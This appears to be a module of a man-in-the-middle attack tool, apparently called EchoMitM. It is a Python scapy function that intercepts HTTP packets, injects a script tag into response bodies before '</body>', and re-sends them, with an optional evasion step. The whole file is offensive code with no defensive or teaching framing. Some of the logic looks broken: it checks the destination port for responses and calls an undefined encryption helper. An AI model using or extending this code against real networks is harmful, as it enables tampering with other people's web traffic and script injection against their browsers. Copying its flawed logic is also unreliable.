from scapy.all import *
import logging
import random

logger = logging.getLogger(__name__)

async def inject_content(packet, config):
    if packet.haslayer(TCP) and packet[TCP].dport == 80 and packet.haslayer(HTTPResponse):
        try:
            load = packet[TCP].payload.load.decode()
            modified_load = load.replace('</body>', f'<script>alert("Injected by EchoMitM_{random.randint(1000, 9999)}");</script></body>')
            packet[TCP].payload.load = modified_load.encode()
            if config['evasion']['use_encryption']:
                packet = encrypt_packet(packet)
            send(packet, verbose=False)
            logger.info("Content injected into HTTP response.")
            return True
        except Exception as e:
            logger.error(f"HTTP injection failed: {e}")
    return False
